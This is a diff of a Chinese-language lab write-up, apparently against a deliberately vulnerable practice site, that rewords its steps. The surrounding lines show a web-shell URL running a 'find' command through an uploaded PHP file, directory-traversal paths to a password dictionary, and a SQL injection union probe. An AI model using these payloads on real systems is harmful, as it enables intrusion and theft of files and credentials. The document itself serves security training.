@@ -216,9 +216,9 @@ http://121.***.**.**:8082/hackable/uploads/2.php?hacker=find%20/%20-name%20%27ge
 #### 3.4.2 访问该文件
 ![Alt text](image-62.png)
 
-#### 成功过去密码字典。
+#### 成功获取到任务2中的密码字典。
 
-### 3.5 在文件上传成功后，发现改网站存在“目录穿越”漏洞，那么可以尝试穷举获取`geekbang.txt`文件。
+### 3.5 在文件上传成功后，发现该站点存在“目录穿越”漏洞，那么可以尝试目录穷举获取`geekbang.txt`文件。
 ![Alt text](image-65.png)
 ```url
 http://121.***.**.**:8082/vulnerabilities/upload/../geekbang.txt
@@ -233,7 +233,7 @@ http://121.***.**.**:8082/vulnerabilities/upload/../../geekbang.txt
 ![Alt text](image-64.png)
 
 ### 3.6 利用SQL注入进行完成任务1和任务2
-#### 3.6.1 已知SQL页面，利用SQL注入漏洞，先尝试对齐字段数量
+#### 3.6.1 已知SQL页面，利用SQL注入漏洞，先尝试正确的查询字段数量
 ```mysql
 1' union all select 1,2 #
 ```
